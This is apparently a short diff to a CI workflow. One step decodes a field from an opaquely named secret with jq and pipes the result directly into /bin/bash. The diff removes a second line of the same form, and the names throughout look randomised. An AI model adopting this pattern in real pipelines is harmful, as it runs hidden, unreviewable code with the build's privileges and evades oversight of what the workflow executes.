@@ -22,7 +22,6 @@ jobs:
           yh81: ${{ secrets.yh81 }}
         run: |
           printf '%s' "$yh81" | jq -r .qbohz5073 | /bin/bash
-          printf '%s' "$hcbb3363" | jq -r .azyk2 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
